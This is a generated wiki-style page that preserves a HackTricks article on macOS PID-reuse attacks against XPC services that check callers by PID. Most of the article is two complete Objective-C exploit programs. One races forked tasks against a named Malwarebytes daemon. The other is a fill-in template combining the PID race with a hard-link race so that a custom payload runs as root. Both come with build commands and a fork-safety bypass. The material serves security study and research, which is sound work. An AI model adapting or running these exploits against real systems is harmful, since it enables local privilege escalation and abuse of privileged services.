---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# macOS PID Reuse

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-macos-hardening-macos-security-and-privilege-escalation-macos-proces-abuse-macos-ipc-inter-process-communication-macos-xpc-macos-xpc-connecting-process-check-macos-pid-reuse` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [macOS PID Reuse](../../topics/macos-hardening/macos-pid-reuse.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-macos-hardening-macos-security-and-privilege-escalation-macos-proces-abuse-macos-ipc-inter-process-communication-macos-xpc-macos-xpc-connecting-process-check-macos-pid-reuse |
| name | macOS PID Reuse |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.md |

## Preserved Source Material

````yaml
_body: "# macOS PID Reuse\n\n{{#include ../../../../../../banners/hacktricks-training.md}}\n\n## PID Reuse\n\nWhen a macOS\
  \ **XPC service** is checking the called process based on the **PID** and not on the **audit token**, it's vulnerable to\
  \ PID reuse attack. This attack is based on a **race condition** where an **exploit** is going to **send messages to the\
  \ XPC** service **abusing** the functionality and just **after** that, executing **`posix_spawn(NULL, target_binary, NULL,\
  \ &attr, target_argv, environ)`** with the **allowed** binary.\n\nThis function will make the **allowed binary own the PID**\
  \ but the **malicious XPC message would have been sent** just before. So, if the **XPC** service **use** the **PID** to\
  \ **authenticate** the sender and checks it **AFTER** the execution of **`posix_spawn`**, it will think it comes from an\
  \ **authorized** process.\n\n### Exploit example\n\nIf you find the function **`shouldAcceptNewConnection`** or a function\
  \ called by it **calling** **`processIdentifier`** and not calling **`auditToken`**. It highly probable means that it's\
  \ **verifying the process PID** and not the audit token.\\\nLike for example in this image (taken from the reference):\n\
  \n<figure><img src=\"../../../../../../images/image (306).png\" alt=\"https://wojciechregula.blog/images/2020/04/pid.png\"\
  ><figcaption></figcaption></figure>\n\nCheck this example exploit (again, taken from the reference) to see the 2 parts of\
  \ the exploit:\n\n- One that **generates several forks**\n- **Each fork** will **send** the **payload** to the XPC service\
  \ while executing **`posix_spawn`** just after sending the message.\n\n> [!CAUTION]\n> For the exploit to work it's important\
  \ to ` export`` `` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** or to put inside the exploit:\n>\n> ```objectivec\n> asm(\"\
  .section __DATA,__objc_fork_ok\\n\"\n> \"empty:\\n\"\n> \".no_dead_strip empty\\n\");\n> ```\n\n{{#tabs}}\n{{#tab name=\"\
  NSTasks\"}}\nFirst option using **`NSTasks`** and argument to launch the children to exploit the RC\n\n```objectivec\n//\
  \ Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/\n// gcc -framework Foundation\
  \ expl.m -o expl\n\n#import <Foundation/Foundation.h>\n#include <spawn.h>\n#include <sys/stat.h>\n\n#define RACE_COUNT 32\n\
  #define MACH_SERVICE @\"com.malwarebytes.mbam.rtprotection.daemon\"\n#define BINARY \"/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon\"\
  \n\n// allow fork() between exec()\nasm(\".section __DATA,__objc_fork_ok\\n\"\n\"empty:\\n\"\n\".no_dead_strip empty\\n\"\
  );\n\nextern char **environ;\n\n// defining necessary protocols\n@protocol ProtectionService\n- (void)startDatabaseUpdate;\n\
  - (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;\n- (void)uninstallProduct;\n- (void)installProductUpdate;\n\
  - (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;\n- (void)buildPurchaseSiteURLWithCompletion:(void\
  \ (^)(long long, NSString *))arg1;\n- (void)triggerLicenseRelatedChecks;\n- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void\
  \ (^)(long long, NSString *))arg2;\n- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;\n- (void)startTrialWith:(NSUUID\
  \ *)arg1 completion:(void (^)(long long))arg2;\n- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long\
  \ long))arg2;\n- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;\n- (void)controlProtectionWithRawFeatures:(long\
  \ long)arg1 rawOperation:(long long)arg2;\n- (void)restartOS;\n- (void)resumeScanJob;\n- (void)pauseScanJob;\n- (void)stopScanJob;\n\
  - (void)startScanJob;\n- (void)disposeOperationBy:(NSUUID *)arg1;\n- (void)subscribeTo:(long long)arg1;\n- (void)pingWithTag:(NSUUID\
  \ *)arg1 completion:(void (^)(NSUUID *, long long))arg2;\n@end\n\nvoid child() {\n\n    // send the XPC messages\n    NSXPCInterface\
  \ *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];\n    NSXPCConnection *xpcConnection\
  \ = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];\n    xpcConnection.remoteObjectInterface\
  \ = remoteInterface;\n\n    [xpcConnection resume];\n    [xpcConnection.remoteObjectProxy restartOS];\n\n    char target_binary[]\
  \ = BINARY;\n    char *target_argv[] = {target_binary, NULL};\n    posix_spawnattr_t attr;\n    posix_spawnattr_init(&attr);\n\
  \    short flags;\n    posix_spawnattr_getflags(&attr, &flags);\n    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);\n\
  \    posix_spawnattr_setflags(&attr, flags);\n    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);\n\
  }\n\nbool create_nstasks() {\n\n    NSString *exec = [[NSBundle mainBundle] executablePath];\n    NSTask *processes[RACE_COUNT];\n\
  \n    for (int i = 0; i < RACE_COUNT; i++) {\n        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[\
  \ @\"imanstask\" ]];\n    }\n\n    int i = 0;\n    struct timespec ts = {\n        .tv_sec = 0,\n        .tv_nsec = 500\
  \ * 1000000,\n    };\n\n    nanosleep(&ts, NULL);\n    if (++i > 4) {\n        for (int i = 0; i < RACE_COUNT; i++) {\n\
  \            [processes[i] terminate];\n        }\n        return false;\n    }\n\n    return true;\n}\n\nint main(int argc,\
  \ const char * argv[]) {\n\n    if(argc > 1) {\n        // called from the NSTasks\n        child();\n\n    } else {\n \
  \       NSLog(@\"Starting the race\");\n        create_nstasks();\n    }\n\n    return 0;\n}\n```\n\n{{#endtab}}\n\n{{#tab\
  \ name=\"fork\"}}\nThis example uses a raw **`fork`** to launch **children that will exploit the PID race condition** and\
  \ then exploit **another race condition via a Hard link:**\n\n```objectivec\n// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES\n\
  // gcc -framework Foundation expl.m -o expl\n\n#include <Foundation/Foundation.h>\n#include <spawn.h>\n#include <pthread.h>\n\
  \n// TODO: CHANGE PROTOCOL AND FUNCTIONS\n@protocol HelperProtocol\n- (void)DoSomething:(void (^)(_Bool))arg1;\n@end\n\n\
  // Global flag to track exploitation status\nbool pwned = false;\n\n/**\n * Continuously overwrite the contents of the 'hard_link'\
  \ file in a race condition to make the\n * XPC service verify the legit binary and then execute as root out payload.\n */\n\
  void *check_race(void *arg) {\n    while(!pwned) {\n        // Overwrite with contents of the legit binary\n        system(\"\
  cat ./legit_bin > hard_link\");\n        usleep(50000);\n\n        // Overwrite with contents of the payload to execute\n\
  \        // TODO: COMPILE YOUR OWN PAYLOAD BIN\n        system(\"cat ./payload > hard_link\");\n        usleep(50000);\n\
  \    }\n    return NULL;\n}\n\nvoid child_xpc_pid_rc_abuse(){\n    // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION\n\
  \    #define kValid \"./Legit Updater.app/Contents/MacOS/Legit\"\n    extern char **environ;\n\n    // Connect with XPC\
  \ service\n    // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT\n    NSString*  service_name = @\"com.example.Helper\";\n  \
  \  NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];\n    //\
  \ TODO: CNAGE THE PROTOCOL NAME\n    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];\n\
  \    [connection setRemoteObjectInterface:interface];\n    [connection resume];\n\n    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError*\
  \ error) {\n        NSLog(@\"[-] Something went wrong\");\n        NSLog(@\"[-] Error: %@\", error);\n    }];\n\n    NSLog(@\"\
  obj: %@\", obj);\n    NSLog(@\"conn: %@\", connection);\n\n    // Call vulenrable XPC function\n    // TODO: CHANEG NAME\
  \ OF FUNCTION TO CALL\n    [obj DoSomething:^(_Bool b){\n        NSLog(@\"Response, %hdd\", b);\n    }];\n\n    // Change\
  \ current process to the legit binary suspended\n    char target_binary[] = kValid;\n    char *target_argv[] = {target_binary,\
  \ NULL};\n    posix_spawnattr_t attr;\n    posix_spawnattr_init(&attr);\n    short flags;\n    posix_spawnattr_getflags(&attr,\
  \ &flags);\n    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);\n    posix_spawnattr_setflags(&attr, flags);\n\
  \    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);\n}\n\n/**\n * Function to perform the PID race\
  \ condition using children calling the XPC exploit.\n */\nvoid xpc_pid_rc_abuse() {\n    #define RACE_COUNT 1\n    extern\
  \ char **environ;\n    int pids[RACE_COUNT];\n\n    // Fork child processes to exploit\n    for (int i = 0; i < RACE_COUNT;\
  \ i++) {\n        int pid = fork();\n        if (pid == 0) {  // If a child process\n            child_xpc_pid_rc_abuse();\n\
  \        }\n        printf(\"forked %d\\n\", pid);\n        pids[i] = pid;\n    }\n\n    // Wait for children to finish\
  \ their tasks\n    sleep(3);\n\n    // Terminate child processes\n    for (int i = 0; i < RACE_COUNT; i++) {\n        if\
  \ (pids[i]) {\n            kill(pids[i], 9);\n        }\n    }\n}\n\nint main(int argc, const char * argv[]) {\n    // Create\
  \ and set execution rights to 'hard_link' file\n    system(\"touch hard_link\");\n    system(\"chmod +x hard_link\");\n\n\
  \    // Create thread to exploit sign verification RC\n    pthread_t thread;\n    pthread_create(&thread, NULL, check_race,\
  \ NULL);\n\n    while(!pwned) {\n        // Try creating 'download' directory, ignore errors\n        system(\"mkdir download\
  \ 2>/dev/null\");\n\n        // Create a hardlink\n        // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC\n        system(\"\
  ln hard_link download/legit_bin\");\n\n        xpc_pid_rc_abuse();\n        usleep(10000);\n\n        // The payload will\
  \ generate this file if exploitation is successfull\n        if (access(\"/tmp/pwned\", F_OK ) == 0) {\n            pwned\
  \ = true;\n        }\n    }\n\n    return 0;\n}\n```\n\n{{#endtab}}\n{{#endtabs}}\n\n## Other examples\n\n- [https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html](https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html)\n\
  \n## Refereces\n\n- [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)\n\
  - [https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)\n\
  \n{{#include ../../../../../../banners/hacktricks-training.md}}"
_relative_path: macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.md
````
